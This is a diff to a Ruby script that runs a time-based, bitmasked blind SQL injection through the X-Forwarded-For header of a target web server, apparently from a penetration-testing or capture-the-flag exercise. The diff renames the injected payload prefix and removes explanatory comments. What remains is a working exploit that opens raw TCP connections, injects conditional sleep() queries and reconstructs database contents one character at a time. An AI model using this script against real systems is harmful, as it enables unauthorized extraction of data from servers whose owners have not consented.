@@ -16,11 +16,10 @@ puts "Starting Bitmasked Blind Timebased SQLi in X-Forwarded-For header of #{tar
 puts line
 
 
-#inj = "#{computer}"
 str = ""
  
 def test(sql,target,port)
-  p = "hacker' or if((#{sql}),sleep(0.4),0) and '1'='1"
+  p = "testing' or if((#{sql}),sleep(0.4),0) and '1'='1"
   t = Time.now
   begin
     s = TCPSocket.new("#{target}",port)
@@ -32,28 +31,18 @@ def test(sql,target,port)
   return ((Time.now-t)>0.5)
 end
 
-# dummy initialisation for the while loop
-# we loop until the returned value is null
 value = 1
 i = 0
 
 while value != 0
-  # i is the position in the string
   i+=1
-  # initialise to 0 the value we are trying to retrieve
   value = 0
-  # for each bit
   0.upto(6) do |bit|
-    # 2**bit is 2^bit and will do all the bit masking work
     sql = "select ascii(substring((#{inj}),#{i},1))&#{2**bit}"
     if test(sql, target, port)
-      # if the returned value is true
-      # we add the mask to the current_value
       value+=2**bit
     end
   end
-  # value is an ascii value, we get the corresponding character
-  # using the `.chr` ruby function
   str+= value.chr
   puts str
 end
